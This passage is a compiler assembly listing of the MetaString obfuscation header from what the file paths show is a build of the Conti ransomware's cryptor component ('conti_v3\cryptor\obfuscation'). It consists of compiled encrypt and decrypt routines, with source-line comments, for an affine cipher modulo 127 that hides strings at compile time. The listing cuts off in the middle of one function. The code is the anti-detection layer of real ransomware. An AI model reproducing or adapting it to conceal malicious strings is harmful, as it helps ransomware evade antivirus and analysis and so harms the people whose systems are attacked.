?isDecrypted@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 5d	 sub	 eax, 93			; 0000005dH
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5d	 add	 r8d, 93			; 0000005dH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 1c	 sub	 eax, 28
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1c	 add	 r8d, 28
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 21	 sub	 eax, 33			; 00000021H
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 21	 add	 r8d, 33			; 00000021H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 42 00 00 00	 mov	 ecx, 66			; 00000042H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt, COMDAT

